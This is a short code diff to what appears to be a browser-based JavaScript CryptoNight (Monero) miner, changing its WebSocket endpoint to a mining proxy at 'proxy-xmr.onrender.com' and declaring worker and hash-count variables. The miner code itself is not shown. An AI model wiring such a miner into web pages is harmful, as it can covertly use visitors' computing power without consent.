@@ -2,7 +2,7 @@
 // MINER.JS - ALGORITMO CRYPTONIGHT REAL (SISTEMA DE HASH ITERATIVO)
 // =========================================================================
 
-var server = "wss://://onrender.com"; 
+var server = "wss://proxy-xmr.onrender.com"; 
 var ws = null;
 var workers = [];
 var totalhashes = 0;
